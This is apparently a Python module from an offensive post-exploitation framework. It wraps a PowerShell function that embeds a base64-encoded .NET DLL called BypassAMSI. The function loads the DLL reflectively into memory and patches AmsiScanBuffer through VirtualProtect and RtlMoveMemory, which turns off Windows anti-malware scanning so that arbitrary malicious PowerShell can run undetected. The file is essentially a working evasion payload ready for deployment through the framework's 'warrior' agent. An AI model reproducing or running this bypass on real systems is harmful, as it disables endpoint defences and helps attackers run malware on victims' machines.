from termcolor import colored, cprint
from module import Module


class CustomModule(Module):
    def __init__(self):
        information = {"Name": "amsi-memory",
                       "Description": "amsi bypass base 64 memory",
                       "Reference": "https://0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html",
                       "Author": "@pablogonzalezpe, @josueencinar"
                       }

        # -----------name-----default_value--description--required?
        options = {"warrior": [None, "Warrior in war", True]}

        # Constructor of the parent class
        super(CustomModule, self).__init__(information, options)

    # This module must be always implemented, it is called by the run option
    def run_module(self):
        function = """function amsi-memory {
                if(-not ([System.Management.Automation.PSTypeName]"Bypass.AMSI").Type) {
                        $first = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQ"
                        $second = "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WIAc3JjAERpc2FibGUAUnVudGltZUZpZWxkSGFuZGxlAENvbnNvbGUAaE1vZHVsZQBwcm9jTmFtZQBuYW1lAFdyaXRlTGluZQBWYWx1ZVR5cGUAQ29tcGlsZXJHZW5lcmF0ZWRBdHRyaWJ1dGUAR3VpZEF0dHJpYnV0ZQBEZWJ1Z2dhYmxlQXR0cmlidXRlAENvbVZpc2libGVBdHRyaWJ1dGUAQXNzZW1ibHlUaXRsZUF0dHJpYnV0ZQBBc3NlbWJseVRyYWRlbWFya0F0dHJpYnV0ZQBUYXJnZXRGcmFtZXdvcmtBdHRyaWJ1dGUAQXNzZW1ibHlGaWxlVmVyc2lvbkF0dHJpYnV0ZQBBc3NlbWJseUNvbmZpZ3VyYXRpb25BdHRyaWJ1dGUAQXNzZW1ibHlEZXNjcmlwdGlvbkF0dHJpYnV0ZQBDb21waWxhdGlvblJlbGF4YXRpb25zQXR0cmlidXRlAEFzc2VtYmx5UHJvZHVjdEF0dHJpYnV0ZQBBc3NlbWJseUNvcHlyaWdodEF0dHJpYnV0ZQBBc3NlbWJseUNvbXBhbnlBdHRyaWJ1dGUAUnVudGltZUNvbXBhdGliaWxpdHlBdHRyaWJ1dGUAQnl0ZQBkd1NpemUAc2l6ZQBTeXN0ZW0uUnVudGltZS5WZXJzaW9uaW5nAEFsbG9jSEdsb2JhbABNYXJzaGFsAEtlcm5lbDMyLmRsbABCeXBhc3NBTVNJLmRsbABTeXN0ZW0AU3lzdGVtLlJlZmxlY3Rpb24Ab3BfQWRkaXRpb24AWmVybwAuY3RvcgBVSW50UHRyAFN5c3RlbS5EaWFnbm9zdGljcwBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBEZWJ1Z2dpbmdNb2RlcwBSdW50aW1lSGVscGVycwBCeXBhc3MAR2V0UHJvY0FkZHJlc3MAbHBBZGRyZXNzAE9iamVjdABscGZsT2xkUHJvdGVjdABWaXJ0dWFsUHJvdGVjdABmbE5ld1Byb3RlY3QAb3BfRXhwbGljaXQAZGVzdABJbml0aWFsaXplQXJyYXkAQ29weQBMb2FkTGlicmFyeQBSdGxNb3ZlTWVtb3J5AG9wX0VxdWFsaXR5AAAAABFhAG0AcwBpAC4AZ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"
                        [Reflection.Assembly]::Load([Convert]::FromBase64String($first+$second)) | Out-Null
                    }
                    $res = [Bypass.AMSI]::Disable()
                    if ($res -eq 0) {
                        return "Patched"
                    } else {
                        return "No Patched"
                    }
                }
            """

        function += 'amsi-memory'

        super(CustomModule, self).run(function)